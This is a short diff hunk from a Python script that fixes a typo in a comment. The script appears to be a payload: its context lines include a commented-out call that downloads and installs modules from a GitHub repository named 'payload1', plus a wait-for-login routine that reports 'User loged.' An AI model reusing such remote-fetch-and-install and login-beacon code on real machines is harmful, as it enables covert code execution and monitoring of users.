@@ -171,7 +171,7 @@ def sleep_until_user_loged():
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
-#Sleep unitil %username% return a value
+#Sleep until %username% return a value
 sleep_until_user_loged()
 send_message("User loged.")
 
